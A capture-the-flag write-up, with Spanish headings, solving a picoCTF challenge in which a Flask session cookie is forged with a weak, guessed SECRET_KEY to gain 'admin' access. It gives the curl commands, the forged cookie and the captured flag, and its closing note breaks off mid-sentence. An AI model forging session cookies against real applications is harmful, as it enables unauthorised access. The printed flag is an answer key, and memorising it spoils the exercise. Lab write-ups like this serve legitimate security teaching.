## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

[http://wily-courier.picoctf.net:55166/](http://wily-courier.picoctf.net:55166/)

1.- How secure is a flask cookie?

## Solución
```
curl -s -i http://wily-courier.picoctf.net:55166/

Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.arH4WQ.PpYiWbqz1PR6R36_T3d2cmUOJik; HttpOnly; Path=/

{"very_auth":"blank"}

tassie

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arH4dA.Uww1NjWe9855AKHd16t0vj8myh0

curl -s -b "session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arH4dA.Uww1NjWe9855AKHd16t0vj8myh0" http://wily-courier.picoctf.net:55166/display

Flag: picoCTF{cO0ki3s_yum_98b76c03}

picoCTF{cO0ki3s_yum_98b76c03}
```

## Notas Adicionales
- La vulnerabilidad fue una `SECRET_KEY` débil elegida de una lista pequeña de nombres de 

## Referencias
- http://wily-courier.picoctf.net:55166/
